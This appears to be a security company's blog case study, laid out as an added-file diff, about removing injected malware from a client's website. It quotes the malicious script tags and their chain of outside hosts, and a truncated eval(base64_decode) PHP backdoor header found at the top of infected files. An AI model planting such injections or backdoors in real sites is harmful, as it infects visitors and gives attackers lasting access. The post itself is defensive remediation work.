@@ -1,0 +1,59 @@
+Removing malware from a web site – Case Study
+
+We deal with web-based malware every day here at Sucuri. Some are encrypted and very hard to detect and remove, but most of them are not. This case study is about the later, simpler, but very annoying web-based javascript malware that we dealt with. Hope you like it.
+It all started a few days ago when a prospective client contacted us saying that they were notified that their site was being reported as an “attack site” by Google Chrome, but was working well on Explorer. They wanted to make sure it worked well on Chrome too…
+The client wasn’t a technical person, so he was not aware that their site was hosting malware and blacklisted by Google. Every browser (Chrome, Firefox, etc) that used Google’s blacklist would report their site as an “attack site”.
+Not good news for any site owner. You lose credibility, lose traffic and money. If they had been using our Web-based Integrity monitor, that would not have happened, but since they didn’t, now it was time to fix the problem.
+We will detail the steps we took hoping that can it useful for anyone else dealing with these issues.
+1- Shutting down the site
+We didn’t want to see their site spreading more malware, so we got the FTP credentials (shared host, so no SSH access), and renamed the public_html directory to something else and added a quick “were are in maintenance mode” index.html to the site.
+$ rename public_html publichtml_saved
+$ mkdir public_html
+$ put newindex public_html/index.html
+2- Changing the passwords
+We didn’t know how the attackers got in, but changing the password was a good defense to make sure they wouldn’t mess up with our work or get back in. Plus, since it was a shared host, there wasn’t much more we could do.
+3- Analyzing the malware
+To analyze the malware, we first downloaded the whole public_html directory that we have saved. As always, we used our friendly ncftpget to get the job done:
+$ mkdir clientX
+$ ncftpget -z -u USER -p PASS -R clientX.com ./clientX /publichtml_saved
+Once it was done, we ran our code-scan tool to find out all the malware on the web-based files. We won’t be sharing this tool for now, but you can easily grep for iframes, javascripts pointing to external php files or very big encoded lines to find 99% of the malware.
+$ code-scan clientX
+** PHP inside javascript: **
+clientX/public_html/xx/Install.html:
+<script  src=”https://hentai.com.br/images/gifimg.php >
+clientX/public_html/xx/License.html:
+< script src=https://hentai.com.br/images/gifimg.php >
+clientX/public_html/xx/file.js:
+document.write(“<script src=”https://macagnanmalhas.com.br/imagens_fck/conteudo…
+clientX/public_html/xx/file2.js:
+document.write(‘<script src=”https://hentai.com.br/images/gifimg.ph..
+..
+As we scanned, we noticed that EVERY single html and javascript file had a reference to these two sites included. Every single one. The hentai site has been fixed and was already blacklisted as we analyzed it, but the other one from macagnanmalhas was still live at the time of our analysis. We tried to see what it was doing by dumping the content:
+$ lynx –source –dump https://macagnanmalhas.com.br/imagens_fck/conteudo.php
+document.write(“<script src=”https://craisa.com.br/up/topluto4.php>”);
+Hum… So it was actually pointing to another javascript at craisa.com.br that was in fact pointing at another site (how annoying):
+$ lynx –source –dump https://craisa.com.br/up/topluto4.php
+document.write(“<script src=”https://grupogrotta.com.br/tao/trabalhe.php />”);
+And the final javascrip was already removed, so we couldn’t analyze it. Oh well.. Moving on..
+We also detected that every single PHP file had malware injected at the top of the script. They all started with:
+<?php  eval (base64_decode(“aWYoIWZ1bmN0aW9uX2V4aXN0cygndTVzeicpKXtmdW
+jUpeyRlPXByZWdfbWF0Y2goJyNbXCciXVteXHNcJyJcLiw7XD8hXFtcXTovPD5cKFwpXXszMCx9IycsJHYp
+What this script does? After changing the “eval” for an “echo” statement, we can see:
+
+Basically a PHP script to inject malicious code in a site and act as a backdoor.
+4- Fixing the site
+Since the attackers went crazy and infected every single file, manually removing the malware was out of question. If they had a backup of the site, it would be easy, but since they didn’t have it either, we had to resort to some shell scripting.
+What did we do? We knew there was only these 3 instances of malware spread at all the files. So we ran the find command passing the files to sed to remove those malware lines.
+$ find ./ | grep -i -E “.html|.htm|.php|.js” | xargs sed -i “s#<?php eval (base64_decode ( .*)); ??>##g”
+$ find ./ | grep -i -E “.html|.php|.js” | xargs sed -i ‘s#<script src=”https://mac.*/script”> ##g’
+$ find ./ | grep -i -E “.html|.php|.js” | xargs sed -i ‘s#< script src=https://hentai..*/script> ##g’
+Done! All files fixed, now we used ncftpput to put the same back up:
+$ ncftpput -z -u USER -p PASS -R clientX.com /public_html ./clientX/public_html
+5- Lessons Learned
+Malware is a pain and anyone can be affected. However, they didn’t have any security measures in place, making it much harder to deal with it. For reference, our suggestions were (and they apply to every site on shared servers):
+
+Make sure you have backups done at least weekly
+Use strong FTP passwords
+Keep your desktop virus-free
+Monitor your web sites for malware/blacklisting
+Keep your web applications updated (if using any)
